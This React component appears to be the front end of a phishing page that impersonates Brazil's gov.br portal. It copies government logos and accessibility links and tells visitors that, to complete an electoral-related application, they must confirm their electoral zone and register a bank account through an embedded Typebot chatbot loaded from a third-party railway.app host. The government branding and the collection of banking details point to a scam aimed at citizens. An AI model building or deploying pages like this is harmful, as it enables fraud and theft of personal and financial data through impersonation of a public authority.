import { useEffect } from "react";

declare global {
  namespace JSX {
    interface IntrinsicElements {
      'typebot-standard': React.DetailedHTMLProps<React.HTMLAttributes<HTMLElement>, HTMLElement>;
    }
  }
}

export default function Chat() {
  useEffect(() => {
    // Criar script do Typebot
    const script = document.createElement("script");
    script.type = "module";
    script.innerHTML = `
      import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0/dist/web.js';

      Typebot.initStandard({
        typebot: "my-typebot-o0z0uia",
        apiHost: "https://viewer-production-e969.up.railway.app",
      });
    `;
    document.body.appendChild(script);

    return () => {
      // Cleanup: remover script ao desmontar
      document.body.removeChild(script);
    };
  }, []);

  return (
    <>
      <header>
        <a href="#">
          <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
        </a>
        <div id="acessibilidade">
          <span>
            <a href="#">
              <i className="fa fa-adjust"></i>
              <span>Alto Contraste</span>
            </a>
          </span>
          <span>
            <a href="#">
              <i className="fa fa-deaf"></i>
              <span>VLibras</span>
            </a>
          </span>
        </div>
      </header>

      <div className="container">
        <aside id="aside-signin">
          <img
            id="identidade-govbr"
            src="/images/conta_govbr_v2.jpg"
            alt="Logomarca GovBR"
          />
        </aside>

        <main id="main-signin">
          <div className="card" id="login-cpf">
            <h3>Última Etapa - Confirmação via Chat</h3>
            <p style={{ marginBottom: "20px" }}>
              Para finalizar sua inscrição, precisamos confirmar alguns detalhes
              importantes através do nosso assistente virtual:
            </p>

            <ul
              style={{
                marginBottom: "20px",
                paddingLeft: "20px",
                fontSize: "14px",
                lineHeight: "1.8",
              }}
            >
              <li>Confirmação de zona eleitoral</li>
              <li>Disponibilidade de datas e horários</li>
              <li>Cadastro de conta bancária para recebimento</li>
              <li>Esclarecimento de dúvidas sobre a função</li>
            </ul>

            <p style={{ fontSize: "13px", color: "#666", marginBottom: "20px" }}>
              <strong>Importante:</strong> Responda todas as perguntas do
              assistente para concluir sua candidatura.
            </p>

            <div
              style={{
                backgroundColor: "#f5f5f5",
                padding: "20px",
                borderRadius: "8px",
                minHeight: "600px",
                border: "1px solid #ddd",
              }}
            >
              {/* O Typebot será injetado aqui */}
              <div id="typebot-container"></div>
            </div>

            <p
              style={{
                marginTop: "20px",
                fontSize: "13px",
                color: "#666",
                textAlign: "center",
              }}
            >
              Após concluir o chat, você será direcionado para a confirmação
              final.
            </p>
          </div>
        </main>
      </div>

      <footer></footer>
    </>
  );
}
